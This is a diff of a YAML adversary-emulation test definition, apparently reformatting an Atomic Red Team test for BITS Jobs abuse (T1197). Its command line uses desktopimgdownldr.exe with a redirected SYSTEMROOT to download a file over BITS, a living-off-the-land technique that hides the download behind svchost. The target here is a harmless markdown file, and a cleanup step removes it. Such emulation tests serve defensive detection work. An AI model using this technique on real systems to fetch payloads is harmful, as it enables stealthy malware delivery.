@@ -1,14 +1,16 @@
-- id: b2848987-a6d0-5f18-bb38-b9cb10cb8d73
+- requirements: []
   name: Soumaia ART Tests - Bits download using desktopimgdownldr.exe (cmd)
   description: "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/"
   tactic: stealth
-  technique:
-    attack_id: T1197
-    name: BITS Jobs
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
-        cleanup: |-
-          del C:\Windows\Temp\Personalization\LockScreenImage\*.md >nul 2>&1
+  technique_id: T1197
+  technique_name: BITS Jobs
+  executors:
+  - cleanup:
+    - del C:\Windows\Temp\Personalization\LockScreenImage\*.md >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+  id: b2848987-a6d0-5f18-bb38-b9cb10cb8d73
